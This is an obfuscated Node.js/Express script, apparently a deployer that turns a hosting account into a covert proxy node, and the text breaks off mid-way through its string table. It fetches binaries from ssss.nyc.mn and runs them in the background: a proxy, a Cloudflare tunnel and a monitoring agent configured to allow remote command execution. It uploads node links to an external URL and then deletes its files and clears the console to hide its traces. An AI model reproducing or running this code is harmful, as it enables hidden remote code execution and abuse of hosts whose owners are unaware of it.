const _0x41a7ba = _0x3ca1
;(function (_0x11d6cf, _0x14dee5) {
  const _0x313d83 = _0x3ca1,
    _0x4f31d4 = _0x11d6cf()
  while (!![]) {
    try {
      const _0x53cf5d =
        parseInt(_0x313d83(0x66)) / 0x1 +
        (parseInt(_0x313d83(0x132)) / 0x2) * (parseInt(_0x313d83(0xae)) / 0x3) +
        (-parseInt(_0x313d83(0xeb)) / 0x4) * (-parseInt(_0x313d83(0xaa)) / 0x5) +
        (parseInt(_0x313d83(0x6b)) / 0x6) * (-parseInt(_0x313d83(0x8c)) / 0x7) +
        -parseInt(_0x313d83(0x82)) / 0x8 +
        (parseInt(_0x313d83(0x102)) / 0x9) * (parseInt(_0x313d83(0xbe)) / 0xa) +
        parseInt(_0x313d83(0x12f)) / 0xb
      if (_0x53cf5d === _0x14dee5) break
      else _0x4f31d4['push'](_0x4f31d4['shift']())
    } catch (_0x2d7c0b) {
      _0x4f31d4['push'](_0x4f31d4['shift']())
    }
  }
})(_0x372c, 0x4839a)
const express = require(_0x41a7ba(0x67)),
  app = express(),
  axios = require(_0x41a7ba(0xff)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x41a7ba(0x125)),
  { promisify } = require('util'),
  exec = promisify(require(_0x41a7ba(0x8e))[_0x41a7ba(0x95)]),
  UPLOAD_URL = process[_0x41a7ba(0xdc)][_0x41a7ba(0x91)] || '',
  PROJECT_URL = process['env'][_0x41a7ba(0xdf)] || '',
  AUTO_ACCESS = process[_0x41a7ba(0xdc)][_0x41a7ba(0x103)] || ![],
  FILE_PATH = process[_0x41a7ba(0xdc)][_0x41a7ba(0x99)] || _0x41a7ba(0x77),
  NEZHA_SERVER = process[_0x41a7ba(0xdc)]['NEZHA_SERVER'] || '',
  NEZHA_PORT = process[_0x41a7ba(0xdc)]['NEZHA_PORT'] || '',
  NEZHA_KEY = process[_0x41a7ba(0xdc)][_0x41a7ba(0x10e)] || '',
  UUID = process[_0x41a7ba(0xdc)]['UUID'] || _0x41a7ba(0x10b),
  ARGO_AUTH = process[_0x41a7ba(0xdc)][_0x41a7ba(0xd5)] || _0x41a7ba(0x108),
  ARGO_DOMAIN = process['env'][_0x41a7ba(0x119)] || 'deployzy.933993.xyz',
  ARGO_PORT = process[_0x41a7ba(0xdc)][_0x41a7ba(0xd1)] || 0xe2e1,
  SUB_PATH = process[_0x41a7ba(0xdc)]['SUB_PATH'] || '800',
  PORT = process[_0x41a7ba(0xdc)][_0x41a7ba(0x8f)] || process[_0x41a7ba(0xdc)][_0x41a7ba(0xa7)] || 0xbb8,
  NAME = process['env']['NAME'] || _0x41a7ba(0xd2),
  CFIP = process['env'][_0x41a7ba(0xfb)] || _0x41a7ba(0x8d),
  CFPORT = process[_0x41a7ba(0xdc)][_0x41a7ba(0xb7)] || 0x1bb
!fs[_0x41a7ba(0xe0)](FILE_PATH)
  ? (fs[_0x41a7ba(0xba)](FILE_PATH), console[_0x41a7ba(0xa2)](FILE_PATH + '\x20is\x20created'))
  : console[_0x41a7ba(0xa2)](FILE_PATH + _0x41a7ba(0x131))
function generateRandomName() {
  const _0x5ad6c8 = _0x41a7ba,
    _0x38815f = _0x5ad6c8(0x73)
  let _0x58d15e = ''
  for (let _0x4c448a = 0x0; _0x4c448a < 0x6; _0x4c448a++) {
    _0x58d15e += _0x38815f['charAt'](Math[_0x5ad6c8(0x6c)](Math['random']() * _0x38815f[_0x5ad6c8(0x70)]))
  }
  return _0x58d15e
}
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path['join'](FILE_PATH, npmName),
  phpPath = path[_0x41a7ba(0x6f)](FILE_PATH, phpName),
  webPath = path[_0x41a7ba(0x6f)](FILE_PATH, webName),
  botPath = path[_0x41a7ba(0x6f)](FILE_PATH, botName),
  subPath = path[_0x41a7ba(0x6f)](FILE_PATH, _0x41a7ba(0xc3)),
  listPath = path['join'](FILE_PATH, _0x41a7ba(0x118)),
  bootLogPath = path[_0x41a7ba(0x6f)](FILE_PATH, _0x41a7ba(0x85)),
  configPath = path[_0x41a7ba(0x6f)](FILE_PATH, 'config.json')
function deleteNodes() {
  const _0x338849 = _0x41a7ba
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x338849(0xe0)](subPath)) return
    let _0x33022e
    try {
      _0x33022e = fs[_0x338849(0x10d)](subPath, _0x338849(0x121))
    } catch {
      return null
    }
    const _0x275d47 = Buffer[_0x338849(0xfe)](_0x33022e, _0x338849(0x7a))[_0x338849(0x10a)](_0x338849(0x121)),
      _0x50e213 = _0x275d47[_0x338849(0x105)]('\x0a')['filter']((_0x48890b) => /(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x48890b))
    if (_0x50e213[_0x338849(0x70)] === 0x0) return
    return (
      axios[_0x338849(0x6e)](UPLOAD_URL + _0x338849(0x93), JSON['stringify']({ nodes: _0x50e213 }), { headers: { 'Content-Type': _0x338849(0x97) } })[
        _0x338849(0xf4)
      ]((_0x2e8f48) => {
        return null
      }),
      null
    )
  } catch (_0x42c64c) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x392893 = _0x41a7ba
  try {
    const _0x1bb39e = fs[_0x392893(0xe1)](FILE_PATH)
    _0x1bb39e[_0x392893(0xb5)]((_0x494464) => {
      const _0x25ec5c = _0x392893,
        _0x1f2ba1 = path[_0x25ec5c(0x6f)](FILE_PATH, _0x494464)
      try {
        const _0x19c09e = fs[_0x25ec5c(0xbb)](_0x1f2ba1)
        _0x19c09e[_0x25ec5c(0xe8)]() && fs['unlinkSync'](_0x1f2ba1)
      } catch (_0x3dc140) {}
    })
  } catch (_0x1fe99c) {}
}
async function generateConfig() {
  const _0x40b54e = _0x41a7ba,
    _0x15496c = {
      log: { access: _0x40b54e(0xa9), error: '/dev/null', loglevel: _0x40b54e(0xb2) },
      inbounds: [
        {
          port: ARGO_PORT,
          protocol: _0x40b54e(0xf3),
          settings: {
            clients: [{ id: UUID, flow: _0x40b54e(0x89) }],
            decryption: _0x40b54e(0xb2),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x40b54e(0xab), dest: 0xbba },
              { path: _0x40b54e(0x9e), dest: 0xbbb },
              { path: _0x40b54e(0x92), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x40b54e(0xd3) }
        },
        {
          port: 0xbb9,
          listen: _0x40b54e(0xc9),
          protocol: 'vless',
          settings: { clients: [{ id: UUID }], decryption: _0x40b54e(0xb2) },
          streamSettings: { network: _0x40b54e(0xd3), security: _0x40b54e(0xb2) }
        },
        {
          port: 0xbba,
          listen: _0x40b54e(0xc9),
          protocol: _0x40b54e(0xf3),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x40b54e(0xb2) },
          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: _0x40b54e(0xab) } },
          sniffing: { enabled: !![], destOverride: [_0x40b54e(0xbd), _0x40b54e(0xa3), _0x40b54e(0xc1)], metadataOnly: ![] }
        },
        {
          port: 0xbbb,
          listen: _0x40b54e(0xc9),
          protocol: _0x40b54e(0xad),
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x40b54e(0x9e) } },
          sniffing: { enabled: !![], destOverride: [_0x40b54e(0xbd), _0x40b54e(0xa3), _0x40b54e(0xc1)], metadataOnly: ![] }
        },
        {
          port: 0xbbc,
          listen: _0x40b54e(0xc9),
          protocol: _0x40b54e(0xa6),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x40b54e(0xb2), wsSettings: { path: _0x40b54e(0x92) } },
          sniffing: { enabled: !![], destOverride: [_0x40b54e(0xbd), _0x40b54e(0xa3), _0x40b54e(0xc1)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x40b54e(0xc5)] },
      outbounds: [
        { protocol: _0x40b54e(0xe5), tag: 'direct' },
        { protocol: _0x40b54e(0xcb), tag: _0x40b54e(0x9a) }
      ]
    }
  fs[_0x40b54e(0xe6)](path['join'](FILE_PATH, _0x40b54e(0xa0)), JSON['stringify'](_0x15496c, null, 0x2))
}
function _0x3ca1(_0x34cd49, _0x116849) {
  const _0x372c4a = _0x372c()
  return (
    (_0x3ca1 = function (_0x3ca1f7, _0x178438) {
      _0x3ca1f7 = _0x3ca1f7 - 0x66
      let _0x7e1592 = _0x372c4a[_0x3ca1f7]
      return _0x7e1592
    }),
    _0x3ca1(_0x34cd49, _0x116849)
  )
}
function getSystemArchitecture() {
  const _0x1b02e9 = _0x41a7ba,
    _0xcc77a6 = os[_0x1b02e9(0x9d)]()
  return _0xcc77a6 === _0x1b02e9(0xf1) || _0xcc77a6 === 'arm64' || _0xcc77a6 === _0x1b02e9(0x96) ? 'arm' : _0x1b02e9(0x69)
}
function downloadFile(_0x3c5dd5, _0x46d191, _0x49385f) {
  const _0x2397e5 = _0x41a7ba,
    _0x2d09f8 = _0x3c5dd5
  !fs[_0x2397e5(0xe0)](FILE_PATH) && fs[_0x2397e5(0xba)](FILE_PATH, { recursive: !![] })
  const _0xadcb7 = fs[_0x2397e5(0xbf)](_0x2d09f8)
  axios({ method: 'get', url: _0x46d191, responseType: 'stream' })
    [_0x2397e5(0xf7)]((_0x2580a4) => {
      const _0x38bb20 = _0x2397e5
      ;(_0x2580a4['data'][_0x38bb20(0xce)](_0xadcb7),
        _0xadcb7['on'](_0x38bb20(0xd9), () => {
          const _0x2897df = _0x38bb20
          ;(_0xadcb7[_0x2897df(0x88)](),
            console[_0x2897df(0xa2)](_0x2897df(0xde) + path[_0x2897df(0xb3)](_0x2d09f8) + _0x2897df(0xb0)),
            _0x49385f(null, _0x2d09f8))
        }),
        _0xadcb7['on']('error', (_0xfec696) => {
          const _0x301cb0 = _0x38bb20
          fs['unlink'](_0x2d09f8, () => {})
          const _0x9ce757 = 'Download\x20' + path[_0x301cb0(0xb3)](_0x2d09f8) + _0x301cb0(0x11b) + _0xfec696[_0x301cb0(0xf0)]
          ;(console['error'](_0x9ce757), _0x49385f(_0x9ce757))
        }))
    })
    [_0x2397e5(0xf4)]((_0x5e8a92) => {
      const _0x2f325d = _0x2397e5,
        _0x2849d8 = _0x2f325d(0xde) + path[_0x2f325d(0xb3)](_0x2d09f8) + _0x2f325d(0x11b) + _0x5e8a92[_0x2f325d(0xf0)]
      ;(console[_0x2f325d(0xf9)](_0x2849d8), _0x49385f(_0x2849d8))
    })
}
async function downloadFilesAndRun() {
  const _0x452f8d = _0x41a7ba,
    _0x3f532e = getSystemArchitecture(),
    _0x4bca0d = getFilesForArchitecture(_0x3f532e)
  if (_0x4bca0d['length'] === 0x0) {
    console[_0x452f8d(0xa2)](_0x452f8d(0xe2))
    return
  }
  const _0x37377a = _0x4bca0d['map']((_0x4c8266) => {
    return new Promise((_0x4a5cfb, _0x34e230) => {
      const _0x54a6c9 = _0x3ca1
      downloadFile(_0x4c8266[_0x54a6c9(0x116)], _0x4c8266[_0x54a6c9(0x11a)], (_0x234e9f, _0x310d29) => {
        _0x234e9f ? _0x34e230(_0x234e9f) : _0x4a5cfb(_0x310d29)
      })
    })
  })
  try {
    await Promise[_0x452f8d(0x81)](_0x37377a)
  } catch (_0x2783b9) {
    console['error'](_0x452f8d(0x9f), _0x2783b9)
    return
  }
  function _0x4a62e7(_0x506c48) {
    const _0x5a129d = 0x1fd
    _0x506c48['forEach']((_0x767979) => {
      const _0x2a5697 = _0x3ca1
      fs[_0x2a5697(0xe0)](_0x767979) &&
        fs[_0x2a5697(0xb1)](_0x767979, _0x5a129d, (_0x4e2660) => {
          const _0x207674 = _0x2a5697
          _0x4e2660
            ? console[_0x207674(0xf9)](_0x207674(0xe9) + _0x767979 + ':\x20' + _0x4e2660)
            : console[_0x207674(0xa2)](_0x207674(0xda) + _0x767979 + ':\x20' + _0x5a129d['toString'](0x8))
        })
    })
  }
  const _0x131254 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x4a62e7(_0x131254)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x3edf15 = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER[_0x452f8d(0x105)](':')[_0x452f8d(0xcf)]() : '',
        _0x40af3a = new Set([_0x452f8d(0x112), '8443', _0x452f8d(0xb4), _0x452f8d(0x104), _0x452f8d(0x11e), _0x452f8d(0x128)]),
        _0x4db18a = _0x40af3a['has'](_0x3edf15) ? 'true' : 'false',
        _0x11b1fe =
          _0x452f8d(0xa1) +
          NEZHA_KEY +
          _0x452f8d(0x6a) +
          NEZHA_SERVER +
          '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20' +
          _0x4db18a +
          _0x452f8d(0x72) +
          UUID
      fs[_0x452f8d(0xe6)](path[_0x452f8d(0x6f)](FILE_PATH, _0x452f8d(0x86)), _0x11b1fe)
      const _0x25a447 = _0x452f8d(0x129) + phpPath + _0x452f8d(0x120) + FILE_PATH + _0x452f8d(0xe4)
      try {
        ;(await exec(_0x25a447), console['log'](phpName + _0x452f8d(0xc8)), await new Promise((_0x44f3f0) => setTimeout(_0x44f3f0, 0x3e8)))
      } catch (_0x272c45) {
        console[_0x452f8d(0xf9)](_0x452f8d(0x7e) + _0x272c45)
      }
    } else {
      let _0x2d032d = ''
      const _0x35c698 = [_0x452f8d(0x112), _0x452f8d(0x114), _0x452f8d(0xb4), '2087', _0x452f8d(0x11e), _0x452f8d(0x128)]
      _0x35c698[_0x452f8d(0xea)](NEZHA_PORT) && (_0x2d032d = _0x452f8d(0x98))
      const _0x3c4b27 =
        _0x452f8d(0x129) +
        npmPath +
        '\x20-s\x20' +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x452f8d(0x83) +
        NEZHA_KEY +
        '\x20' +
        _0x2d032d +
        _0x452f8d(0x123)
      try {
        ;(await exec(_0x3c4b27), console[_0x452f8d(0xa2)](npmName + _0x452f8d(0xc8)), await new Promise((_0x5ce823) => setTimeout(_0x5ce823, 0x3e8)))
      } catch (_0x5e7d8d) {
        console[_0x452f8d(0xf9)](_0x452f8d(0xee) + _0x5e7d8d)
      }
    }
  } else console[_0x452f8d(0xa2)](_0x452f8d(0x94))
  const _0x954178 = _0x452f8d(0x129) + webPath + _0x452f8d(0x90) + FILE_PATH + _0x452f8d(0xd6)
  try {
    ;(await exec(_0x954178), console[_0x452f8d(0xa2)](webName + _0x452f8d(0xc8)), await new Promise((_0x9573fa) => setTimeout(_0x9573fa, 0x3e8)))
  } catch (_0x22018c) {
    console['error'](_0x452f8d(0x71) + _0x22018c)
  }
  if (fs['existsSync'](botPath)) {
    let _0x52faa0
    if (ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))
      _0x52faa0 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH['match'](/TunnelSecret/)
        ? (_0x52faa0 = _0x452f8d(0x84) + FILE_PATH + _0x452f8d(0x87))
        : (_0x52faa0 = _0x452f8d(0xfc) + FILE_PATH + '/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:' + ARGO_PORT)
    try {
      ;(await exec(_0x452f8d(0x129) + botPath + '\x20' + _0x52faa0 + _0x452f8d(0x74)),
        console['log'](botName + _0x452f8d(0xc8)),
        await new Promise((_0x549d73) => setTimeout(_0x549d73, 0x7d0)))
    } catch (_0x389294) {
      console['error'](_0x452f8d(0xc7) + _0x389294)
    }
  }
  await new Promise((_0x4087f7) => setTimeout(_0x4087f7, 0x1388))
}
function getFilesForArchitecture(_0x458589) {
  const _0xc9b031 = _0x41a7ba
  let _0x47a041
  _0x458589 === 'arm'
    ? (_0x47a041 = [
        { fileName: webPath, fileUrl: _0xc9b031(0xf8) },
        { fileName: botPath, fileUrl: _0xc9b031(0x7d) }
      ])
    : (_0x47a041 = [
        { fileName: webPath, fileUrl: 'https://amd64.ssss.nyc.mn/web' },
        { fileName: botPath, fileUrl: _0xc9b031(0xcc) }
      ])
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const _0x3ad192 = _0x458589 === 'arm' ? _0xc9b031(0x80) : _0xc9b031(0x12d)
      _0x47a041['unshift']({ fileName: npmPath, fileUrl: _0x3ad192 })
    } else {
      const _0x394a3d = _0x458589 === _0xc9b031(0xf1) ? _0xc9b031(0x6d) : 'https://amd64.ssss.nyc.mn/v1'
      _0x47a041[_0xc9b031(0x106)]({ fileName: phpPath, fileUrl: _0x394a3d })
    }
  }
  return _0x47a041
}
function argoType() {
  const _0x5b5250 = _0x41a7ba
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x5b5250(0xa2)](_0x5b5250(0x7f))
    return
  }
  if (ARGO_AUTH[_0x5b5250(0xea)](_0x5b5250(0xcd))) {
    fs[_0x5b5250(0xe6)](path[_0x5b5250(0x6f)](FILE_PATH, _0x5b5250(0xac)), ARGO_AUTH)
    const _0x1a6dbf =
      _0x5b5250(0xaf) +
      ARGO_AUTH[_0x5b5250(0x105)]('\x22')[0xb] +
      '\x0a\x20\x20credentials-file:\x20' +
      path[_0x5b5250(0x6f)](FILE_PATH, _0x5b5250(0xac)) +
      _0x5b5250(0xfa) +
      ARGO_DOMAIN +
      _0x5b5250(0xa4) +
      ARGO_PORT +
      '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'
    fs[_0x5b5250(0xe6)](path[_0x5b5250(0x6f)](FILE_PATH, _0x5b5250(0xa8)), _0x1a6dbf)
  } else console[_0x5b5250(0xa2)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel')
}
async function extractDomains() {
  const _0x2df5b1 = _0x41a7ba
  let _0x44f90e
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x44f90e = ARGO_DOMAIN), console['log'](_0x2df5b1(0x75), _0x44f90e), await _0x5e2c7f(_0x44f90e))
  else
    try {
      const _0x1b58a6 = fs[_0x2df5b1(0x10d)](path['join'](FILE_PATH, _0x2df5b1(0x85)), 'utf-8'),
        _0x1f9769 = _0x1b58a6[_0x2df5b1(0x105)]('\x0a'),
        _0x476c39 = []
      _0x1f9769['forEach']((_0x294754) => {
        const _0x4fd2bb = _0x294754['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x4fd2bb) {
          const _0x3a7fe2 = _0x4fd2bb[0x1]
          _0x476c39['push'](_0x3a7fe2)
        }
      })
      if (_0x476c39[_0x2df5b1(0x70)] > 0x0) ((_0x44f90e = _0x476c39[0x0]), console['log']('ArgoDomain:', _0x44f90e), await _0x5e2c7f(_0x44f90e))
      else {
        ;(console[_0x2df5b1(0xa2)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),
          fs[_0x2df5b1(0xc4)](path[_0x2df5b1(0x6f)](FILE_PATH, _0x2df5b1(0x85))))
        async function _0x47c5e2() {
          const _0x1a8fe9 = _0x2df5b1
          try {
            process[_0x1a8fe9(0xe7)] === _0x1a8fe9(0xd8)
              ? await exec(_0x1a8fe9(0x10c) + botName + _0x1a8fe9(0x115))
              : await exec(_0x1a8fe9(0x107) + botName['charAt'](0x0) + ']' + botName[_0x1a8fe9(0xd7)](0x1) + _0x1a8fe9(0x122))
          } catch (_0x276fd9) {}
        }
        ;(_0x47c5e2(), await new Promise((_0x1fd0ed) => setTimeout(_0x1fd0ed, 0xbb8)))
        const _0xa134fa = _0x2df5b1(0xfc) + FILE_PATH + _0x2df5b1(0x76) + ARGO_PORT
        try {
          ;(await exec('nohup\x20' + botPath + '\x20' + _0xa134fa + _0x2df5b1(0x74)),
            console[_0x2df5b1(0xa2)](botName + _0x2df5b1(0xc8)),
            await new Promise((_0x42b45f) => setTimeout(_0x42b45f, 0xbb8)),
            await extractDomains())
        } catch (_0x4248d5) {
          console[_0x2df5b1(0xf9)](_0x2df5b1(0xc7) + _0x4248d5)
        }
      }
    } catch (_0x345c28) {
      console[_0x2df5b1(0xf9)](_0x2df5b1(0xdb), _0x345c28)
    }
  async function _0x6f0e06() {
    const _0x23612f = _0x2df5b1
    try {
      const _0x52aec3 = await axios[_0x23612f(0xf6)](_0x23612f(0x68), { timeout: 0xbb8 })
      if (_0x52aec3[_0x23612f(0x11f)] && _0x52aec3[_0x23612f(0x11f)][_0x23612f(0x12e)] && _0x52aec3['data'][_0x23612f(0x9b)])
        return _0x52aec3[_0x23612f(0x11f)][_0x23612f(0x12e)] + '_' + _0x52aec3[_0x23612f(0x11f)][_0x23612f(0x9b)]
    } catch (_0x3ed13b) {
      try {
        const _0x926fdd = await axios[_0x23612f(0xf6)](_0x23612f(0xbc), { timeout: 0xbb8 })
        if (
          _0x926fdd[_0x23612f(0x11f)] &&
          _0x926fdd[_0x23612f(0x11f)][_0x23612f(0x8a)] === _0x23612f(0x109) &&
          _0x926fdd['data'][_0x23612f(0xb8)] &&
          _0x926fdd[_0x23612f(0x11f)][_0x23612f(0x9b)]
        )
          return _0x926fdd[_0x23612f(0x11f)][_0x23612f(0xb8)] + '_' + _0x926fdd['data'][_0x23612f(0x9b)]
      } catch (_0x223267) {}
    }
    return _0x23612f(0x127)
  }
  async function _0x5e2c7f(_0x5f2c9e) {
    const _0x1d5d72 = await _0x6f0e06(),
      _0x31237b = NAME ? NAME + '-' + _0x1d5d72 : _0x1d5d72
    return new Promise((_0x2db72f) => {
      setTimeout(() => {
        const _0x30aac3 = _0x3ca1,
          _0x1701bb = {
            v: '2',
            ps: '' + _0x31237b,
            add: CFIP,
            port: CFPORT,
            id: UUID,
            aid: '0',
            scy: _0x30aac3(0xb2),
            net: 'ws',
            type: _0x30aac3(0xb2),
            host: _0x5f2c9e,
            path: _0x30aac3(0xd0),
            tls: _0x30aac3(0xa3),
            sni: _0x5f2c9e,
            alpn: '',
            fp: _0x30aac3(0xed)
          },
          _0x3f077a =
            _0x30aac3(0x100) +
            UUID +
            '@' +
            CFIP +
            ':' +
            CFPORT +
            _0x30aac3(0x7b) +
            _0x5f2c9e +
            '&fp=firefox&type=ws&host=' +
            _0x5f2c9e +
            _0x30aac3(0x113) +
            _0x31237b +
            _0x30aac3(0x126) +
            Buffer['from'](JSON[_0x30aac3(0xb9)](_0x1701bb))[_0x30aac3(0x10a)]('base64') +
            '\x0a\x0atrojan://' +
            UUID +
            '@' +
            CFIP +
            ':' +
            CFPORT +
            '?security=tls&sni=' +
            _0x5f2c9e +
            _0x30aac3(0xf2) +
            _0x5f2c9e +
            _0x30aac3(0xc2) +
            _0x31237b +
            _0x30aac3(0xef)
        ;(console[_0x30aac3(0xa2)](Buffer[_0x30aac3(0xfe)](_0x3f077a)[_0x30aac3(0x10a)]('base64')),
          fs[_0x30aac3(0xe6)](subPath, Buffer[_0x30aac3(0xfe)](_0x3f077a)[_0x30aac3(0x10a)](_0x30aac3(0x7a))),
          console[_0x30aac3(0xa2)](FILE_PATH + '/sub.txt\x20saved\x20successfully'),
          uploadNodes(),
          app['get']('/' + SUB_PATH, (_0x27bf84, _0x5ca4c4) => {
            const _0x478c33 = _0x30aac3,
              _0x28c32e = Buffer[_0x478c33(0xfe)](_0x3f077a)[_0x478c33(0x10a)]('base64')
            ;(_0x5ca4c4[_0x478c33(0xca)](_0x478c33(0x130), 'text/plain;\x20charset=utf-8'), _0x5ca4c4[_0x478c33(0xfd)](_0x28c32e))
          }),
          _0x2db72f(_0x3f077a))
      }, 0x7d0)
    })
  }
}
async function uploadNodes() {
  const _0xdcb5c1 = _0x41a7ba
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x140bdb = PROJECT_URL + '/' + SUB_PATH,
      _0x579093 = { subscription: [_0x140bdb] }
    try {
      const _0xd97e4d = await axios[_0xdcb5c1(0x6e)](UPLOAD_URL + _0xdcb5c1(0xec), _0x579093, { headers: { 'Content-Type': _0xdcb5c1(0x97) } })
      return _0xd97e4d && _0xd97e4d[_0xdcb5c1(0x8a)] === 0xc8 ? (console[_0xdcb5c1(0xa2)](_0xdcb5c1(0x111)), _0xd97e4d) : null
    } catch (_0xb20821) {
      if (_0xb20821['response']) {
        if (_0xb20821['response'][_0xdcb5c1(0x8a)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0xdcb5c1(0xe0)](listPath)) return
      const _0x2b8a27 = fs[_0xdcb5c1(0x10d)](listPath, 'utf-8'),
        _0x590107 = _0x2b8a27[_0xdcb5c1(0x105)]('\x0a')[_0xdcb5c1(0xc6)]((_0x48c7f0) =>
          /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xdcb5c1(0x79)](_0x48c7f0)
        )
      if (_0x590107[_0xdcb5c1(0x70)] === 0x0) return
      const _0x5b7e28 = JSON[_0xdcb5c1(0xb9)]({ nodes: _0x590107 })
      try {
        const _0x20237d = await axios[_0xdcb5c1(0x6e)](UPLOAD_URL + _0xdcb5c1(0x12b), _0x5b7e28, { headers: { 'Content-Type': _0xdcb5c1(0x97) } })
        return _0x20237d && _0x20237d[_0xdcb5c1(0x8a)] === 0xc8 ? (console[_0xdcb5c1(0xa2)](_0xdcb5c1(0x8b)), _0x20237d) : null
      } catch (_0x24d8e8) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  setTimeout(() => {
    const _0x33a16b = _0x3ca1,
      _0x386d1a = [bootLogPath, configPath, webPath, botPath]
    if (NEZHA_PORT) _0x386d1a[_0x33a16b(0x7c)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x386d1a[_0x33a16b(0x7c)](phpPath)
    process[_0x33a16b(0xe7)] === 'win32'
      ? exec(_0x33a16b(0x101) + _0x386d1a[_0x33a16b(0x6f)]('\x20') + _0x33a16b(0x9c), (_0x3404d0) => {
          const _0x1ca36b = _0x33a16b
          ;(console[_0x1ca36b(0xb6)](), console['log'](_0x1ca36b(0xf5)), console[_0x1ca36b(0xa2)](_0x1ca36b(0xe3)))
        })
      : exec('rm\x20-rf\x20' + _0x386d1a[_0x33a16b(0x6f)]('\x20') + _0x33a16b(0x11c), (_0x56983c) => {
          const _0x27f2d2 = _0x33a16b
          ;(console[_0x27f2d2(0xb6)](),
            console[_0x27f2d2(0xa2)]('App\x20is\x20running'),
            console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
        })
  }, 0x15f90)
}
cleanFiles()
function _0x372c() {
  const _0x3671cc = [
    '61946LGNmzg',
    '31595tfYeiz',
    'express',
    'https://ipapi.co/json',
    'amd',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    '12jpilMh',
    'floor',
    'https://arm64.ssss.nyc.mn/v1',
    'post',
    'join',
    'length',
    'web\x20running\x20error:\x20',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'abcdefghijklmnopqrstuvwxyz',
    '\x20>/dev/null\x202>&1\x20&',
    'ARGO_DOMAIN:',
    '/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:',
    '.tmp',
    'promises',
    'test',
    'base64',
    '?encryption=none&security=tls&sni=',
    'push',
    'https://arm64.ssss.nyc.mn/bot',
    'php\x20running\x20error:\x20',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'https://arm64.ssss.nyc.mn/agent',
    'all',
    '855912aEeQwm',
    '\x20-p\x20',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20',
    'boot.log',
    'config.yaml',
    '/tunnel.yml\x20run',
    'close',
    'xtls-rprx-vision',
    'status',
    'Nodes\x20uploaded\x20successfully',
    '1848889BEmMEs',
    'mfa.gov.ua',
    'child_process',
    'SERVER_PORT',
    '\x20-c\x20',
    'UPLOAD_URL',
    '/trojan-argo',
    '/api/delete-nodes',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    'exec',
    'aarch64',
    'application/json',
    '--tls',
    'FILE_PATH',
    'block',
    'org',
    '\x20>\x20nul\x202>&1',
    'arch',
    '/vmess-argo',
    'Error\x20downloading\x20files:',
    'config.json',
    '\x0aclient_secret:\x20',
    'log',
    'tls',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'trojan',
    'PORT',
    'tunnel.yml',
    '/dev/null',
    '304545yyOZaL',
    '/vless-argo',
    'tunnel.json',
    'vmess',
    '36OtwYVa',
    '\x0a\x20\x20tunnel:\x20',
    '\x20successfully',
    'chmod',
    'none',
    'basename',
    '2096',
    'forEach',
    'clear',
    'CFPORT',
    'countryCode',
    'stringify',
    'mkdirSync',
    'statSync',
    'http://ip-api.com/json',
    'http',
    '10ANntpD',
    'createWriteStream',
    'index.html',
    'quic',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'sub.txt',
    'unlinkSync',
    'https+local://8.8.8.8/dns-query',
    'filter',
    'Error\x20executing\x20command:\x20',
    '\x20is\x20running',
    '127.0.0.1',
    'set',
    'blackhole',
    'https://amd64.ssss.nyc.mn/bot',
    'TunnelSecret',
    'pipe',
    'pop',
    '/vmess-argo?ed=2560',
    'ARGO_PORT',
    'js-node',
    'tcp',
    'utf8',
    'ARGO_AUTH',
